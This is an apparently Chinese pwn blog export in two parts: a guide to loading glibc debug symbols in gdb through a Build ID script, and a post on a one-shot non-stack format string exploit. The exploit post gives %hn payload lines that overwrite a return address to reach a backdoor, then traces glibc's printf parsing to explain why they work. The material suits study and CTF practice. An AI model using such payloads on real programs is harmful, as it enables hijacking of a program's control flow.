<li>用于确保文件未被篡改，或用于匹配特定版本的依赖项。</li>
</ul>
</li>
</ol>
<hr>
<h6 id="生成方式"><a href="#生成方式" class="headerlink" title="生成方式"></a><strong>生成方式</strong></h6><p><code>Build ID</code> 是通过对 ELF 文件的内容（如代码段和数据段）进行哈希计算生成的，具体方式取决于工具链。它通常由 <strong>编译器</strong> 或 <strong>链接器</strong> 自动生成，存储在 ELF 文件的 <code>.note.gnu.build-id</code> 段中。</p>
<h6 id="查看-ELF-文件的-Build-ID"><a href="#查看-ELF-文件的-Build-ID" class="headerlink" title="查看 ELF 文件的 Build ID"></a><strong>查看 ELF 文件的 Build ID</strong></h6><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">1.readelf -n /path/to/file | grep &#x27;Build ID&#x27;</span><br><span class="line">2.file /path/to/file</span><br></pre></td></tr></table></figure></div>
<h5 id="debug"><a href="#debug" class="headerlink" title=".debug"></a>.debug</h5><p>通常<code>symbol file</code>会在一个<code>.debug/.build-id/xx/</code>的目录下，这里在<code>build-id</code>中会有一堆2位16进制数构成的目录名，实际在.debug文件检索时，会先根据<code>build-id</code>的第一个字节（最高位）来进入对应前缀的文件夹，然后在该目录下找对应的.debug文件。比如我们的<code>build-id</code>为<code>89c3cb85f9e55046776471fed05ec441581d1969</code>，那么我们目标的.debug文件就在<code>.debug/.build-id/89/c3cb85f9e55046776471fed05ec441581d1969.debug</code>这个位置。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/23/%E5%B8%A6%E7%AC%A6%E5%8F%B7%E8%B0%83%E8%AF%95-gdb%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%8C%96%E5%8A%A0%E8%BD%BD/image-20241123105018012.png"
                      class=""
                >
<h4 id="手动加载符号文件"><a href="#手动加载符号文件" class="headerlink" title="手动加载符号文件"></a>手动加载符号文件</h4><p>一般来说，我们用<code>glibc-all-in-one</code>下载到的glibc都是连带着<code>.debug</code>一起下的，但我们pwndbg会找不到目标的符号文件。我们可以直接在gdb中用<code>add-symbol-file /path/to/.debug</code>来读取符号信息。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/23/%E5%B8%A6%E7%AC%A6%E5%8F%B7%E8%B0%83%E8%AF%95-gdb%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%8C%96%E5%8A%A0%E8%BD%BD/image-20241123105847709.png"
                      class=""
                >
<p>或者也可以在<code>~/.gdbinit</code>中加一个<code>set debug-file-directory /path/to/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/.debug/</code>，然后进入gdb时就会自动检索到<code>.debug</code>文件，附加调试符号信息。</p>
<h4 id="自动化进行附加符号文件"><a href="#自动化进行附加符号文件" class="headerlink" title="自动化进行附加符号文件"></a>自动化进行附加符号文件</h4><p>既然我们已经知道了手动附加的原理，这里我们就可以尝试使用脚本进行自动化附加。这里我们选择用gdb中的<code>info proc mappings</code>命令来获取libc的基址以及路径，后续.debug文件路径的判断也是基于此。所以我们想要附加生效，就要链接到glibc-all-in-one中的libc。</p>
<p>在gdbinit中加入如下命令，这里使用了<code>gdb.events.stop.connect</code>来使gdb在停下来的时候调用函数进行加载<code>symbol file</code>，这是因为gdb.attach(p)时，<code>.gdbinit</code>是先加载后再把gdb附加到进程的，如果直接调用会报错。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">python</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">DEBUG_FILE_DIR = <span class="string">&quot;/home/collectcrop/glibc_run/glibc-all-in-one/libs&quot;</span></span><br><span class="line">symbols_loaded = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_build_id</span>(<span class="params">lib_path</span>):</span><br><span class="line">    <span class="comment">#从给定的库路径提取 build-id</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">	<span class="comment">#用外部命令获取build id</span></span><br><span class="line">        res = subprocess.check_output(</span><br><span class="line">            <span class="string">f&quot;readelf -n <span class="subst">&#123;lib_path&#125;</span> | grep &#x27;Build ID&#x27;&quot;</span>, </span><br><span class="line">            shell=<span class="literal">True</span>, </span><br><span class="line">            text=<span class="literal">True</span></span><br><span class="line">        )</span><br><span class="line">        <span class="comment"># 提取 Build ID 字符串</span></span><br><span class="line">        build_id = res[res.find(<span class="string">&#x27;:&#x27;</span>)+<span class="number">2</span>:]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] Build ID: <span class="subst">&#123;build_id&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> build_id</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">except</span> gdb.error <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] Error extracting build-id for <span class="subst">&#123;lib_path&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_debug_symbols</span>():</span><br><span class="line">    <span class="keyword">global</span> symbols_loaded</span><br><span class="line">    mappings = gdb.execute(<span class="string">&quot;info proc mappings&quot;</span>, to_string=<span class="literal">True</span>).splitlines()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> mappings:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;/libc.so&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">            parts = line.split()</span><br><span class="line">            libc_path = parts[-<span class="number">1</span>]</span><br><span class="line">            libc_base = parts[<span class="number">0</span>]</span><br><span class="line">            build_id = get_build_id(libc_path)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> build_id:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-] Could not determine Build ID for libc.&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            </span><br><span class="line">            DEBUG_FILE_DIR = libc_path.replace(<span class="string">&quot;/libc.so.6&quot;</span>, <span class="string">&quot;/.debug/.build-id&quot;</span>)</span><br><span class="line">            <span class="comment"># 解析 .debug 文件路径</span></span><br><span class="line">            debug_file_path = os.path.join(</span><br><span class="line">                DEBUG_FILE_DIR,</span><br><span class="line">                build_id[:<span class="number">2</span>],</span><br><span class="line">                build_id[<span class="number">2</span>:].replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>) + <span class="string">&quot;.debug&quot;</span></span><br><span class="line">            )</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[*] debug file: <span class="subst">&#123;debug_file_path&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> os.path.exists(DEBUG_FILE_DIR):</span><br><span class="line">                <span class="keyword">if</span> os.path.exists(debug_file_path):</span><br><span class="line">                    gdb.execute(<span class="string">f&quot;add-symbol-file <span class="subst">&#123;debug_file_path&#125;</span> <span class="subst">&#123;libc_base&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[+] Loaded symbols for <span class="subst">&#123;libc_path&#125;</span> from <span class="subst">&#123;debug_file_path&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[-] Debug file not found: <span class="subst">&#123;debug_file_path&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[-] Build ID directory not found: <span class="subst">&#123;DEBUG_FILE_DIR&#125;</span>&quot;</span>)</span><br><span class="line">            symbols_loaded = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 延迟加载符号，确保附加到进程后运行</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_stop</span>(<span class="params">event</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> symbols_loaded:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Target process stopped. Attempting to load symbols...&quot;</span>)</span><br><span class="line">        load_debug_symbols()</span><br><span class="line"></span><br><span class="line">gdb.events.stop.connect(on_stop)</span><br><span class="line">end</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>然后就能愉快地调试了，好耶。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/23/%E5%B8%A6%E7%AC%A6%E5%8F%B7%E8%B0%83%E8%AF%95-gdb%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%8C%96%E5%8A%A0%E8%BD%BD/image-20241123121652093.png"
                      class=""
                >
<h4 id="一般换库步骤"><a href="#一般换库步骤" class="headerlink" title="一般换库步骤"></a>一般换库步骤</h4><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">strings ./libc.so.6  | grep &#x27;GNU&#x27;		#看给的libc版本</span><br><span class="line">ldd ./binary							#看程序动态链接库的情况</span><br><span class="line">patchelf --replace-needed original_libc target_libc ./binary	#换libc，original_libc由上面ldd能看到</span><br><span class="line">patchelf --set-interpreter target_ld ./binary					#换ld</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>debug</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>gdb</tag>
        <tag>debug</tag>
      </tags>
  </entry>
  <entry>
    <title>非栈上格式化字符串一次利用</title>
    <url>/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h4 id="问题发展路径"><a href="#问题发展路径" class="headerlink" title="问题发展路径"></a>问题发展路径</h4><ul>
<li>一开始最基本的格式化字符串漏洞任意地址写，没有什么限制</li>
<li>进阶一点的是非栈上的格式化字符串漏洞利用，需要利用到栈上的指向程序名称的链条以及靠近内核区域的链条，但这种方法正常而言需要多次格式化字符串漏洞的执行利用，对目标地址改动越大需要利用到越多次。</li>
<li>最后是在读取内容非栈上的情况下，实现在一次格式化字符串漏洞的触发中直接进行对一个栈上地址的两个字节的修改，可以用于减少利用格式化字符串漏洞的次数，绕过更多的限制。</li>
</ul>
<h4 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h4><p>比如我们假设程序中有后门函数，目标是把栈上的返回地址的后两个字节给覆盖了以实现返回到后门函数中去。其中要利用到的两个链条的偏移分别为15和45。按照一般的多次漏洞的利用来说，是要先通过覆盖偏移15处的<code>0x7ffd991d220e</code>的低两个字节<code>0x220e</code>为<code>0x1898</code>，这样以后在r12指向的偏移45处就会是一个指针直接指向要返回到的地址，然后再通过写偏移45处内容的低两个字节实现对返回地址的低两个字节的写入。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001001143123.png"
                      class=""
                >
<p>这里我们很容易就想到尝试直接把两个并到一起写，就有了如下payload：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">f&quot;%<span class="subst">&#123;part1&#125;</span>c%15$hn&quot;</span> + <span class="string">f&quot;%<span class="subst">&#123;part2&#125;</span>c%45$hn&quot;</span></span><br></pre></td></tr></table></figure></div>
<p>但在实际调试过后会发现现实的残酷，这个格式化字符串的解析中并不是按照先来后到的顺序，先解析完前一个再解析后一个的。实际上这里改的内容都是原偏移地址处指针指向的内容，最后并不会对返回地址进行修改。</p>
<p>于是就有如下的比较神奇的绕过方法，就可以通过格式化字符串参数解析的特性来实现逐级的赋值。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&quot;%p&quot;</span>*<span class="number">13</span></span><br><span class="line">payload = <span class="string">f&quot;%<span class="subst">&#123;part1-<span class="number">130</span>-<span class="number">0x8</span>&#125;</span>c%hn&quot;</span> + <span class="string">f&quot;%<span class="subst">&#123;part2&#125;</span>c%45$hn&quot;</span></span><br></pre></td></tr></table></figure></div>
<p>这里省略掉了<code>%x$n</code>这种组合，而是直接<code>%hn</code>，这样省略以后会根据顺序来确定指定的参数偏移，由于前面有14个%，这里的%实际就会被解析为指向偏移15处的参数，这样一来在%的解析阶段就能把指定内容写到偏移15的指针处，从而与后面的内容进行联动，实现栈上内容的低两个字节内容的修改。这里part1就是我们通过泄露出栈相关地址后，计算出的返回地址在栈上位置的后两个字节。减去130是前面13个%p打印出的内容长度，最后的减0x8是调试后测出来的差值（这个的确不知道是在哪里多的内容）。</p>
<h4 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h4><p>首先在<code>stdio-common/printf.c</code>中可以找到printf的具体实现。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;libioP.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> printf</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Write formatted output to stdout from the format string FORMAT.  */</span></span><br><span class="line"><span class="comment">/* VARARGS1 */</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">__printf (<span class="type">const</span> <span class="type">char</span> *format, ...)</span><br><span class="line">&#123;</span><br><span class="line">  va_list arg;				<span class="comment">//声明一个 va_list 类型的变量 arg，用于存储可变参数列表。</span></span><br><span class="line">  <span class="type">int</span> done;					<span class="comment">//写入的字符数或其他状态信息。</span></span><br><span class="line"></span><br><span class="line">  va_start (arg, format);	<span class="comment">//初始化 arg，使其指向可变参数列表的第一个参数。</span></span><br><span class="line">  done = __vfprintf_internal (<span class="built_in">stdout</span>, format, arg, <span class="number">0</span>);</span><br><span class="line">  va_end (arg);				<span class="comment">//清理 arg，以释放相关资源</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> done;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> _IO_printf</span></span><br><span class="line">ldbl_strong_alias (__printf, <span class="built_in">printf</span>);</span><br><span class="line">ldbl_strong_alias (__printf, _IO_printf);</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>其最核心的功能要到<code>vfprintf.c</code>中去寻找，这里结合gdb带源码调试。</p>
<p>首先会进入ARGCHECK中进行一系列检测，确保格式字符串符合要求。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ARGCHECK(S, Format) \</span></span><br><span class="line"><span class="meta">  do									      \</span></span><br><span class="line"><span class="meta">    &#123;									      \</span></span><br><span class="line"><span class="meta">      <span class="comment">/* Check file argument for consistence.  */</span>			      \</span></span><br><span class="line"><span class="meta">      CHECK_FILE (S, -1);						 <span class="comment">//检查文件流有效性和状态     \</span></span></span><br><span class="line"><span class="comment"><span class="meta">      if (S-&gt;_flags &amp; _IO_NO_WRITES)			//如果指定文件流不可写就返回错误		      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">	&#123;								      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">	  S-&gt;_flags |= _IO_ERR_SEEN;					      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">	  __set_errno (EBADF);						      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">	  return -1;							      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">	&#125;								      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">      if (Format == NULL)			//如果格式化字符串为空就返回错误			      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">	&#123;								      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">	  __set_errno (EINVAL);						      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">	  return -1;							      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">	&#125;								      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">    &#125; while (0)</span></span></span><br></pre></td></tr></table></figure></div>
<p>然后会检查文件流 <code>s</code> 是否处于无缓冲模式，如果处于无缓冲模式，代码调用一个辅助函数 <code>buffered_vfprintf</code>。这个函数的作用是为该流分配一个局部临时缓冲区，然后重新调用原来的格式化输出函数。这样可以在处理输出时提供一个缓冲层，即使原始流不支持缓冲。这里我们调试时会进到<code>buffered_vfprintf</code>里面，最后实际还会调用回<code>vfprintf</code>。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (UNBUFFERED_P (s))</span><br><span class="line"><span class="comment">/* Use a helper function which will allocate a local temporary buffer</span></span><br><span class="line"><span class="comment">   for the stream and then call us again.  */</span></span><br><span class="line">	<span class="keyword">return</span> buffered_vfprintf (s, format, ap, mode_flags);</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001102135414.png"
                      class=""
                >
<p>然后会判断代码是否支持宽字符的处理，然后查找格式字符串中的第一个格式说明符。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> COMPILE_WPRINTF</span></span><br><span class="line">  <span class="comment">/* Find the first format specifier.  */</span></span><br><span class="line">  f = lead_str_end = __find_specwc ((<span class="type">const</span> UCHAR_T *) format);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="comment">/* Find the first format specifier.  */</span></span><br><span class="line">  f = lead_str_end = __find_specmb ((<span class="type">const</span> UCHAR_T *) format);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>
<p>后面也有类似的，但是会自增f，用于逐个解析。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Get current character in format string.  */</span></span><br><span class="line">      JUMP (*++f, step0_jumps);</span><br><span class="line">......</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> COMPILE_WPRINTF</span></span><br><span class="line">      f = __find_specwc ((end_of_spec = ++f));</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">      f = __find_specmb ((end_of_spec = ++f));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="comment">/* Write the following constant string.  */</span></span><br><span class="line">      outstring (end_of_spec, f - end_of_spec);</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> outstring(String, Len)						\</span></span><br><span class="line"><span class="meta">  do									\</span></span><br><span class="line"><span class="meta">    &#123;									\</span></span><br><span class="line"><span class="meta">      const void *string_ = (String);					\</span></span><br><span class="line"><span class="meta">      done = outstring_func (s, string_, (Len), done);			\</span></span><br><span class="line"><span class="meta">      <span class="keyword">if</span> (done &lt; 0)							\</span></span><br><span class="line"><span class="meta">	goto all_done;							\</span></span><br><span class="line"><span class="meta">    &#125;									\</span></span><br><span class="line"><span class="meta">   while (0)</span></span><br></pre></td></tr></table></figure></div>
<p>我们现在关注那个指向程序名的链条，栈上地址低3位16进制为288。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001112058996.png"
                      class=""
                >
<p>之后在调试时会发现，f会逐渐自增解析各个格式化字符串中的内容，在解析一串%p时其实不会在每一次outstring中打印内容，而是在解析到<code>%xxxc</code>后一并打印内容出来。之后在解析%hn时，会到这里进行跳转。这里对各种类型修饰符进行了解析</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="comment">/* Process &#x27;h&#x27; modifier.  There might another &#x27;h&#x27; following.  */</span></span><br><span class="line">LABEL (mod_half):</span><br><span class="line">  is_short = <span class="number">1</span>;</span><br><span class="line">  JUMP (*++f, step3a_jumps);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Process &#x27;hh&#x27; modifier.  */</span></span><br><span class="line">LABEL (mod_halfhalf):</span><br><span class="line">  is_short = <span class="number">0</span>;</span><br><span class="line">  is_char = <span class="number">1</span>;</span><br><span class="line">  JUMP (*++f, step4_jumps);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Process &#x27;l&#x27; modifier.  There might another &#x27;l&#x27; following.  */</span></span><br><span class="line">LABEL (mod_long):</span><br><span class="line">  is_long = <span class="number">1</span>;</span><br><span class="line">  JUMP (*++f, step3b_jumps);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Process &#x27;L&#x27;, &#x27;q&#x27;, or &#x27;ll&#x27; modifier.  No other modifier is</span></span><br><span class="line"><span class="comment"> allowed to follow.  */</span></span><br><span class="line">LABEL (mod_longlong):</span><br><span class="line">  is_long_double = <span class="number">1</span>;</span><br><span class="line">  is_long = <span class="number">1</span>;</span><br><span class="line">  JUMP (*++f, step4_jumps);</span><br></pre></td></tr></table></figure></div>
<p><strong>处理 <code>h</code> 修饰符</strong>：</p>
<ul>
<li><code>LABEL (mod_half)</code><ul>
<li>当遇到 <code>h</code> 修饰符时，将 <code>is_short</code> 设置为 1，表示后续的参数应被视为 <code>short int</code> 类型。</li>
<li>然后跳转到下一个处理步骤 <code>step3a_jumps</code>，继续解析后续的格式字符。</li>
</ul>
</li>
</ul>
<p><strong>处理 <code>hh</code> 修饰符</strong>：</p>
<ul>
<li><code>LABEL (mod_halfhalf)</code><ul>
<li>当遇到 <code>hh</code> 修饰符时，设置 <code>is_short</code> 为 0，并将 <code>is_char</code> 设置为 1。这表示后续参数将被视为 <code>unsigned char</code> 类型。</li>
<li>跳转到 <code>step4_jumps</code>，继续后续解析。</li>
</ul>
</li>
</ul>
<p><strong>处理 <code>l</code> 修饰符</strong>：</p>
<ul>
<li><code>LABEL (mod_long)</code><ul>
<li>当遇到 <code>l</code> 修饰符时，将 <code>is_long</code> 设置为 1，表示后续的参数应被视为 <code>long int</code> 类型。</li>
<li>跳转到 <code>step3b_jumps</code>，继续解析。</li>
</ul>
</li>
</ul>
<p><strong>处理 <code>L</code>、<code>q</code> 或 <code>ll</code> 修饰符</strong>：</p>
<ul>
<li><code>LABEL (mod_longlong)</code><ul>
<li>当遇到 <code>L</code>、<code>q</code> 或 <code>ll</code> 修饰符时，将 <code>is_long_double</code> 设置为 1，并将 <code>is_long</code> 设置为 1。这表明后续参数应被视为 <code>long double</code> 类型或 <code>long long int</code> 类型。</li>
<li>这个标签后不允许有其他修饰符，因此跳转到 <code>step4_jumps</code>，继续后续解析。</li>
</ul>
</li>
</ul>
<p>解析完成后，我们发现栈上的内容实际已经被修改了，而后面的内容还没有开始解析。所以在%hn这种方式进行解析后会直接写入目标地址。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001113356649.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001113519869.png"
                      class=""
                >
<p>之后解析到$时会跳转到<code>do_positional</code>进行进一步操作，然后会调用printf_positional进行进一步操作。这边如果步过就能直接完成操作了。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (*f == L_(<span class="string">&#x27;$&#x27;</span>))</span><br><span class="line"><span class="comment">/* Oh, oh.  The argument comes from a positional parameter.  */</span></span><br><span class="line">	<span class="keyword">goto</span> do_positional;</span><br><span class="line">JUMP (*f, step1_jumps);</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">do_positional:</span><br><span class="line">  done = printf_positional (s, format, readonly_format, ap, &amp;ap_save,</span><br><span class="line">			    done, nspecs_done, lead_str_end, work_buffer,</span><br><span class="line">			    save_errno, grouping, thousands_sep, mode_flags);</span><br></pre></td></tr></table></figure></div>
<p>现在我们来看看用<code>payload = f&quot;%&#123;part1&#125;c%15$hn&quot; + f&quot;%&#123;part2&#125;c%45$hn&quot;</code>这个会发生什么。首先在前面<code>%xxxc</code>会直接打印占位符，同样的，我们现在关注指向程序名的链条。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001120346608.png"
                      class=""
                >
<p>程序在解析<code>%&#123;part1&#125;c%15$hn</code>时，会进入<code>printf_positional</code>进行进一步处理，其中解析的核心函数是 <code>nargs += __parse_one_specmb (f, nargs, &amp;specs[nspecs], &amp;max_ref_arg);</code> 然后会发现解析完前面的内容之后，栈上那个指向程序名的指针并没有被改变。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001120419249.png"
                      class=""
                >
<p>当解析完最后一个之后，会进入如下两个switch分支：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (cnt = <span class="number">0</span>; cnt &lt; nspecs; ++cnt)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* If the width is determined by an argument this is an int.  */</span></span><br><span class="line">      <span class="keyword">if</span> (specs[cnt].width_arg != <span class="number">-1</span>)</span><br><span class="line">	args_type[specs[cnt].width_arg] = PA_INT;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* If the precision is determined by an argument this is an int.  */</span></span><br><span class="line">      <span class="keyword">if</span> (specs[cnt].prec_arg != <span class="number">-1</span>)</span><br><span class="line">	args_type[specs[cnt].prec_arg] = PA_INT;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">switch</span> (specs[cnt].ndata_args)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">0</span>:		<span class="comment">/* No arguments.  */</span></span><br><span class="line">	  <span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">1</span>:		<span class="comment">/* One argument; we already have the</span></span><br><span class="line"><span class="comment">			   type and size.  */</span></span><br><span class="line">	  args_type[specs[cnt].data_arg] = specs[cnt].data_arg_type;</span><br><span class="line">	  args_size[specs[cnt].data_arg] = specs[cnt].size;</span><br><span class="line">	  <span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">	  <span class="comment">/* We have more than one argument for this format spec.</span></span><br><span class="line"><span class="comment">	     We must call the arginfo function again to determine</span></span><br><span class="line"><span class="comment">	     all the types.  */</span></span><br><span class="line">	  (<span class="type">void</span>) (*__printf_arginfo_table[specs[cnt].info.spec])</span><br><span class="line">	    (&amp;specs[cnt].info,</span><br><span class="line">	     specs[cnt].ndata_args, &amp;args_type[specs[cnt].data_arg],</span><br><span class="line">	     &amp;args_size[specs[cnt].data_arg]);</span><br><span class="line">	  <span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">--------------------------------------------------------------------------------------------------</span><br><span class="line">      <span class="keyword">for</span> (cnt = <span class="number">0</span>; cnt &lt; nargs; ++cnt)</span><br><span class="line">    <span class="keyword">switch</span> (args_type[cnt])</span><br><span class="line">      &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T(tag, mem, type)				\</span></span><br><span class="line"><span class="meta">	case tag:					\</span></span><br><span class="line"><span class="meta">	  args_value[cnt].mem = va_arg (*ap_savep, type); \</span></span><br><span class="line"><span class="meta">	  break</span></span><br><span class="line"></span><br><span class="line">	T (PA_WCHAR, 